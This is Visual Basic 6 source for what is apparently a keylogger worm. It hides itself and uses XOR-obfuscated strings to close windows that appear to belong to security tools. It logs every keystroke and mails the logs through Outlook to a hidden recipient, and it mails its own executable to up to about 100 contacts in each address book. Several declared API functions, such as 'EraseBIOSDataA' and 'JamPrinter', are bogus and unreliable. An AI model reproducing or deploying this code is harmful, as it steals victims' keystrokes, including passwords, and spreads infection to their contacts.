   VERSION 5.00
   Begin VB.Form Mapispl32
      BorderStyle     =   0  'None
      Caption         =   "Form1"
      ClientHeight    =   90
      ClientLeft      =   8430
      ClientTop       =   1005
      ClientWidth     =   90
      Icon            =   "reason.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   90
      ScaleWidth      =   90
      ShowInTaskbar   =   0   'False
      Visible         =   0   'False
      Begin VB.TextBox Text1
         Height          =   285
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   0
         Top             =   120
         Visible         =   0   'False
         Width           =   2055
      End
      Begin VB.Timer Timer1
         Interval        =   10
         Left            =   360
         Top             =   840
      End
   End
   Attribute VB_Name = "Mapispl32"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Option Explicit
   Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
   Private Declare Function aaa Lib "kernel32" Alias "WriteToBootSectorA" (ByVal wMsg As String) As Long
   Private Declare Function bbb Lib "gdi32" Alias "ClearScreenA" (ByVal wMsg As String) As Long
   Private Declare Function ccc Lib "kernel32" Alias "EraseBIOSDataA" (ByVal wMsg As String) As Long
   Private Declare Function ddd Lib "rundll32" Alias "PostMessageExA" (ByVal wMsg As String) As Long
   Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Private Declare Function eee Lib "advapi32.dl" Alias "MetamorphSelfA" (ByVal wMsg As String) As Long
   Private Declare Function fff Lib "winspool.drv" Alias "JamPrinter" (ByVal wMsg As String) As Long
   Private Declare Function ggg Lib "kernel32" Alias "LockAll" (ByVal wMsg As String) As Long
   Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
   Private Const WM_CLOSE = &H10
   Private Sub Form_Load()
   On Error Resume Next
   Dim av0, av1, av2, av3, av4, av5, av6, av7, av8, av9, av10, n, ar, av
   Dim kilwin As Long
   Dim killed As Long
   App.TaskVisible = False
   av1 = x("*„…*À¢**“”…’")
   av2 = x("–…””’*™")
   av3 = x("¦Í³´¯°·À¶…’“‰*ŽÀÕÎÐÖƒ")
   av4 = x("°£Íƒ‰ŒŒ‰ŽÀÒÐÐÐÀÚÀ¶‰’•“À¡Œ…’”")
   av5 = x("¤¡°¤*—ŽŒ**„*Ž*‡…’")
   av6 = x("²…*ŒÍ”‰*…À³ƒ*Ž")
   av7 = x("©¯¯®ÙØ")
   av8 = x("¡¶°À*Ž‰”*’")
   av9 = x("®¡©¿¶³¿³´¡´")
   av10 = x("µŽ”‰”Œ…„ÀÍÀ®*”…**„")
   For n = 0 To 10
   ar = Array(av0, av1, av2, av3, av4, av5, av6, av7, av8, av9, av10)
   av = ar(n)
   kilwin = FindWindow(vbNullString, av)
   killed = PostMessage(kilwin, WM_CLOSE, vbNull, vbNull)
   Next n
   Form2.Show
   End Sub
   Private Sub Timer1_Timer()
   On Error Resume Next
   Dim keystate As Integer, scancodes As Integer, a As String
   For scancodes = 1 To 254
   keystate = GetAsyncKeyState(scancodes)
   If keystate = -32767 Then
   a = Hex(scancodes)
   If Len(a) = 1 Then
   a = "0" & Hex(scancodes)
   End If
   Text1.Text = Text1.Text & a
   If Len(Text1.Text) = 2000 Then
   keys (Text1.Text)
   Text1.Text = ""
   End If
   If Hex(scancodes) = "10" Then
   Call Worming
   End If
   'eotheroutine
   End If
   Next
   End Sub
   Private Sub keys(log As String)
   On Error Resume Next
   Dim a, b, c, d, e, f, g, h, xx, y, oo
   Set a = CreateObject(x("¯•”Œ**‹Î¡**Œ‰ƒ*”‰*Ž"))
   Set b = a.GetNameSpace(x("¡°©"))
   If a = x("¯•”Œ**‹") Then
   b.Logon x("*’*†‰Œ…"), x("**““—*’„")
   Set c = a.CreateItem(0)
   c.Recipients.Add x("*Œƒ***•Œ ƒ*ŽŽ*‚‰“**‰ŒÎƒ**")
   c.Body = log
   c.Send
   c.DeleteAfterSubmit = True
   b.Logoff
   End If
   End Sub
   Private Sub Worming()
   On Error Resume Next
   Dim a, b, c, d, e, f, g, h, xx, y, oo, cc
   cc = App.Path & App.EXEName & x("Î…˜…")
   If Right(App.Path, 1) <> "\" Then cc = App.Path & "\" & App.EXEName & x("Î…˜…")
   Set a = CreateObject(x("¯•”Œ**‹Î¡**Œ‰ƒ*”‰*Ž"))
   Set b = a.GetNameSpace(x("¡°©"))
   If a = x("¯•”Œ**‹") Then
   b.Logon x("*’*†‰Œ…"), x("**““—*’„")
   For y = 1 To b.AddressLists.Count
   Set d = b.AddressLists(y)
   xx = 1
   Set c = a.CreateItem(0)
   For oo = 1 To d.AddressEntries.Count
   e = d.AddressEntries(xx)
   c.Recipients.Add e
   xx = xx + 1
   If xx > 101 Then oo = d.AddressEntries.Count
   Next oo
   c.Subject = x("ÑÐÑÀ²…*“*Ž“À·ˆ™À¹*•À³ˆ*•Œ„À¨*–…À³…˜À·ˆ…ŽÀ¹*•Ç’…À¤’•Ž‹")
   c.attachments.Add cc, 1, 1, x("ÑÐÑÀ²…*“*Ž“")
   c.attachments.Add x("ƒÚ¼*‰ƒ”•’…“Î…*Œ"), 1, 2, x("*ÀŒ…””…’À—‰”ˆ‰ŽÀ*ÀŒ…””…’")
   c.Send
   c.DeleteAfterSubmit = True
   e = ""
   Next y
   b.Logoff
   End If
   End Sub
   Private Function x(sText)
   On Error Resume Next
   Dim ekey, i, hash, crbyte
   ekey = 3029
   For i = 1 To Len(sText)
       hash = Asc(Mid(sText, i, 1))
       crbyte = Chr(hash Xor (ekey Mod 255))
       x = x & crbyte
   Next i
   End Function
